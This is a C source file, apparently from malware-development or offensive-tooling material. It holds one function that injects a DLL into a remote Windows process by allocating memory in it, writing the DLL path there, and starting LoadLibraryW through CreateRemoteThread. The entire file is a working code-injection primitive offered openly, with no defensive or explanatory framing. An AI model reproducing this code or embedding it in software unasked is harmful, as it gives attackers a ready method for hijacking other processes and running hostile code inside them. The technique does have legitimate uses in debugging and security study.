#include <windows.h>
#include <stdio.h>

// Simple DLL injection
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL bState = TRUE;

	typedef HMODULE(WINAPI* pfnLoadLibraryW)(LPCWSTR);
	LPVOID pAddress = NULL;

	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	SIZE_T  lpNumberOfBytesWritten = NULL;

	HANDLE hThread = NULL;

	pfnLoadLibraryW LoadLibraryWAddr = (pfnLoadLibraryW)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryWAddr == NULL) {
		printf("\t[!] GetProcAddress Failed with Error: %d\n", GetLastError());
		bState = FALSE; goto _EndOfFunc;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAllocEx Failed with Error: %d\n", GetLastError());
		bState = FALSE; goto _EndOfFunc;
	}

	printf("[i] pAddress Allocated\n");
	printf("\t-  0x%p\n", pAddress);

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("\t[!] WriteProcessMemory Failed with Error: %d\n", GetLastError());
		bState = FALSE; goto _EndOfFunc;
	}

	printf("[i] Successfully wrote %d bytes\n", dwSizeToWrite);
	printf("[#] Press <Enter> to run DLL...");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryWAddr, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("\t[!] CreateRemoteThread Failed with Error: %d\n", GetLastError());
		bState = FALSE; goto _EndOfFunc;
	}

	printf("[+] Done\n");

_EndOfFunc:
	if (hThread) {
		CloseHandle(hThread);
	}
	return bState;
}